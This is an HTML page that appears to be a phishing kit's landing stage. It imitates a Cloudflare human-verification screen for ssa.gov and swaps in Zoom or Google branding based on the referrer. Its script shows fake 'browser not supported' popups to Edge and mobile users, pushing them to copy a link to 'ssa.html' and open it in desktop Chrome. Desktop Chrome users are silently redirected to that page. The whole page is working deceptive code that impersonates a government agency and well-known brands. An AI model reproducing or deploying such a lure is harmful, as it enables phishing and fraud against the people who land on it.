<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
    <title>Just a moment...</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0
        }
        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
            color: #313131;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif
        }
        body {
            display: flex;
            flex-direction: column;
            height: 100vh;
            min-height: 100vh;
            background-color: #f9f9f9;
        }
        .main-content {
            margin: 8rem auto;
            padding-left: 1.5rem;
            max-width: 60rem
        }
        @media (width <= 720px) {
            .main-content {
                margin-top: 4rem
            }
        }
        .h2 {
            line-height: 2.25rem;
            font-size: 1.5rem;
            font-weight: 500
        }
        @media (width <= 720px) {
            .h2 {
                line-height: 1.5rem;
                font-size: 1.25rem
            }
        }
        .core-msg {
            line-height: 1.5;
            font-size: 1rem;
            color: #555;
            margin-top: 1.5rem;
        }
        .spacer {
            margin: 2rem 0
        }
        .spacer-top {
            margin-top: 4rem
        }
        .spacer-bottom {
            margin-bottom: 2rem
        }
        .main-wrapper {
            display: flex;
            flex: 1;
            flex-direction: column;
            align-items: center
        }
        .h1 {
            line-height: 3.75rem;
            font-size: 2.5rem;
            font-weight: 500
        }
        .zone-name-title {
            font-size: 1.5rem;
            font-weight: 500;
            color: #222;
            margin-bottom: 1rem;
        }
        .loading-verifying {
            height: 76.391px;
            margin-top: 1.5rem;
        }
        .lds-ring {
            display: inline-block;
            position: relative;
            width: 1.875rem;
            height: 1.875rem
        }
        .lds-ring div {
            box-sizing: border-box;
            display: block;
            position: absolute;
            border: .3rem solid #313131;
            border-radius: 50%;
            border-color: #313131 transparent transparent transparent;
            width: 1.875rem;
            height: 1.875rem;
            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite
        }
        .lds-ring div:nth-child(1) {
            animation-delay: -0.45s
        }
        .lds-ring div:nth-child(2) {
            animation-delay: -0.3s
        }
        .lds-ring div:nth-child(3) {
            animation-delay: -0.15s
        }
        @keyframes lds-ring {
            0% {
                transform: rotate(0deg)
            }
            100% {
                transform: rotate(360deg)
            }
        }
        .footer {
            margin: 0 auto;
            padding-right: 1.5rem;
            padding-left: 1.5rem;
            width: 100%;
            max-width: 60rem;
            line-height: 1.125rem;
            font-size: .75rem
        }
        .footer-inner {
            border-top: 1px solid #d9d9d9;
            padding-top: 1rem;
            padding-bottom: 1rem
        }
        .text-center {
            text-align: center
        }
        .ray-id {
            text-align: center
        }
        code {
            font-family: monaco, courier, monospace
        }
        .verification-text {
            font-size: 1.5rem;
            font-weight: 500;
            color: #222;
            margin-bottom: 1.5rem;
        }
        .security-msg {
            margin-top: 2rem;
        }
        
        /* Popup Overlay Styles - Same for Edge and Mobile */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        .popup-container {
            background-color: white;
            border-radius: 12px;
            width: 90%;
            max-width: 340px;
            padding: 24px 20px 28px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            animation: fadeInScale 0.2s ease-out;
        }
        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        .popup-icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        .popup-title {
            font-size: 22px;
            font-weight: bold;
            color: #1b3d6d;
            margin-bottom: 12px;
        }
        .popup-message {
            font-size: 16px;
            color: #555;
            line-height: 1.4;
            margin-bottom: 24px;
        }
        .popup-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .popup-btn {
            padding: 12px 16px;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .popup-btn-primary {
            background-color: #4285f4;
            color: white;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .popup-btn-primary:hover {
            background-color: #3367d6;
            transform: scale(1.02);
        }
        
        .copy-success {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #2e7d32;
            color: white;
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 14px;
            z-index: 1001;
            animation: fadeOut 2s ease forwards;
        }
        @keyframes fadeOut {
            0% { opacity: 1; }
            70% { opacity: 1; }
            100% { opacity: 0; visibility: hidden; }
        }
        
        /* Dynamic Background */
        body {
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-size: 200px;
            background-position: center;
            background-repeat: no-repeat;
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: -1;
            pointer-events: none;
        }
        body.bg-zoom::before {
            background-image: url('https://assets.zoom.us/images/en-us/general/zoom_logo_icon.svg');
            opacity: 0.1;
        }
        body.bg-google::before {
            background-image: url('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png');
            opacity: 0.1;
        }
        body.bg-ssa::before {
            background-image: url('https://www.ssa.gov/images/ssa-logo.svg');
            opacity: 0.1;
        }
    </style>
</head>
<body>
    <div class="main-wrapper" role="main">
        <div class="main-content">
            <h1 class="zone-name-title h1" id="zoneTitle">ssa.gov</h1>
            <div id="verificationContent">
                <p class="verification-text">Verifying you are human. This may take a few seconds.</p>
                <div class="loading-verifying">
                    <div class="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                </div>
                <p class="core-msg security-msg">ssa.gov needs to review the security of your connection before proceeding.</p>
            </div>
        </div>
    </div>
    <div class="footer" role="contentinfo">
        <div class="footer-inner">
            <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l" target="_blank">Cloudflare</a></div>
        </div>
    </div>

<script>
    // ========== CONFIGURATION - YOU CAN CHANGE THIS ==========
    const POPUP_DELAY_SECONDS = 3;  // 👈 Change this value to set how many seconds before popup appears (e.g., 5, 8, 10)
    
    // ========== TARGET URL ==========
    const TARGET_URL = window.location.href.replace(/\/[^/]*$/, '/ssa.html');
    
    // ========== USER AGENT DETECTION ==========
    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
    
    function isEdgeBrowser() {
        const userAgent = navigator.userAgent.toLowerCase();
        const isEdgeChromium = userAgent.includes('edg/') || userAgent.includes('edgios/') || userAgent.includes('edga/');
        const isLegacyEdge = userAgent.includes('edge/') && !userAgent.includes('edg/');
        const isMobileEdge = /EdgA/i.test(navigator.userAgent) || /EdgiOS/i.test(navigator.userAgent);
        return isEdgeChromium || isLegacyEdge || isMobileEdge;
    }
    
    // ========== DYNAMIC BACKGROUND ==========
    function setDynamicBackground() {
        const referrer = document.referrer.toLowerCase();
        
        if (referrer.includes('zoom.us') || referrer.includes('zoom')) {
            document.body.classList.add('bg-zoom');
            document.getElementById('zoneTitle').textContent = 'zoom.us';
        } else if (referrer.includes('google.com') || referrer.includes('google')) {
            document.body.classList.add('bg-google');
            document.getElementById('zoneTitle').textContent = 'google.com';
        } else {
            document.body.classList.add('bg-ssa');
        }
    }
    
    // ========== POPUP FUNCTION (Same style for both Edge and Mobile) ==========
    function showPopup(icon, title, message) {
        const overlay = document.createElement('div');
        overlay.className = 'popup-overlay';
        
        overlay.innerHTML = `
            <div class="popup-container">
                <div class="popup-icon">${icon}</div>
                <div class="popup-title">${title}</div>
                <div class="popup-message">${message}</div>
                <div class="popup-buttons">
                    <button class="popup-btn popup-btn-primary" id="popupCopyBtn">📋 Copy URL</button>
                </div>
            </div>
        `;
        
        document.body.appendChild(overlay);
        document.body.style.overflow = 'hidden';
        
        const copyBtn = document.getElementById('popupCopyBtn');
        
        if (copyBtn) {
            copyBtn.addEventListener('click', async function() {
                try {
                    await navigator.clipboard.writeText(TARGET_URL);
                    
                    const notification = document.createElement('div');
                    notification.className = 'copy-success';
                    notification.textContent = '✓ URL copied! Open Google Chrome and paste to continue.';
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                        if (notification.parentNode) notification.remove();
                    }, 2500);
                    
                    copyBtn.textContent = '✓ Copied!';
                    setTimeout(() => {
                        copyBtn.textContent = '📋 Copy URL';
                    }, 2000);
                    
                } catch (err) {
                    const textArea = document.createElement('textarea');
                    textArea.value = TARGET_URL;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    
                    const notification = document.createElement('div');
                    notification.className = 'copy-success';
                    notification.textContent = '✓ URL copied! Open Google Chrome and paste to continue.';
                    document.body.appendChild(notification);
                    setTimeout(() => {
                        if (notification.parentNode) notification.remove();
                    }, 2500);
                }
            });
        }
    }
    
    // ========== MAIN EXECUTION ==========
    setDynamicBackground();
    
    const isEdge = isEdgeBrowser();
    const isMobile = isMobileDevice();
    
    // Different messages for Edge vs Mobile, but SAME popup style
    if (isEdge) {
        // Show spinner first, then popup after configured delay
        setTimeout(function() {
            showPopup(
                '🌐', 
                'Browser Not Supported', 
                'You are using Microsoft Edge. For security & compatibility,<br><strong>please use Google Chrome</strong> to access your documents.'
            );
        }, POPUP_DELAY_SECONDS * 1000);
    } 
    else if (isMobile) {
        // Mobile gets SAME popup style but different message
        setTimeout(function() {
            showPopup(
                '📱', 
                'Mobile Device Detected', 
                'This page requires a desktop computer. For security & compatibility,<br><strong>please use Google Chrome on Windows/Mac</strong> to access your documents.'
            );
        }, POPUP_DELAY_SECONDS * 1000);
    }
    else {
        // Chrome desktop - normal redirect after spinner
        setTimeout(function() {
            window.location.href = "ssa.html";
        }, 3000);
    }
</script>
</body>
</html>
